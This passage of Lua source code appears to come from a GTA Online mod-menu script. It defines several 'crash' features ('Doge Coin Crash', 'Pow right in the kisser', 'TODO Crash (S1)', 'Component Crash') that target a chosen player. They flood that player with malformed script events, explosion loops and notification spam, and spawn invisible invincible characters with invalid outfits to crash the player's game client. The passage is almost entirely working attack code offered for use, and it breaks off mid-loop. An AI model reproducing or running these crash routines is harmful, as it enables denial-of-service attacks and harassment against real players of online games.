            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
        	menu.trigger_commands("explodeloop" .. players.get_name(pid))
	menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
	menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
        	menu.trigger_commands("ptfx" .. players.get_name(pid))
        	menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
        	menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Doge that shit then! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    local dogecrash = menu.list(crash, "Doge Coin Crash", {}, "")

    	menu.action(dogecrash, "Doge Coin Crash", {"doge"}, "Skidded the code from a notification Rimuru's doge coin crash sent me and it works well.", function()
    	notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1733737974, pid, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    	menu.toggle_loop(dogecrash, "Doge Coin Crash", {"toggledoge"}, "Skidded the code from a notification Rimuru's doge coin crash sent me and it works well.", function(on_toggle)
    	notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1733737974, pid, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                   end)



    local powcrash = menu.list(crash, "Pow right in the kisser", {}, "")

    	menu.action(powcrash, "Pow right in the kisser", {"pow"}, "A very strong SE/SH crash", function()
    	notification("Pow right in the kisser sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    			end)

    	menu.toggle_loop(powcrash, "Pow right in the kisser", {"togglepow"}, "A very strong SE/SH crash", function(on_toggle)
    	notification("Pow right in the kisser sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    			end)


    local scrash = menu.list(crash, "TODO Crash (S1)", {}, "")

    	menu.action(scrash, "TODO Crash (S1)", {"s1crash"}, "", function()
    	notification("TODO Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("TODO Crashed" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(scrash, "TODO Crash (S1)", {"toggles1crash"}, "Note: DO NOT SPECTATE WHEN TOGGLED.", function(on_toggle)
    	notification("Testing Testing 1-2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("Testing Testing 1-2 " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    local clothescrash = menu.list(crash, "Component Crash", {}, "")

    menu.action(clothescrash, "Component Crash", {"clothescrash"}, "Crash clothes", function()
            if pid ~= players.user() then
                util.toast("Wait 20 Seconds...")
                local math_random = math.random
                local joaat = util.joaat
                menu.trigger_commands("panic on")
                util.yield(100)
                local pedhash = util.joaat("P_franklin_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lazlow")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds2 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds2[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_taocheng")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds3 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds3[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_solomon")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds4 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds4[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_stevehains")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds5 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds5[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_taostranslator")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds6 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds6[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_debra")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds7 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
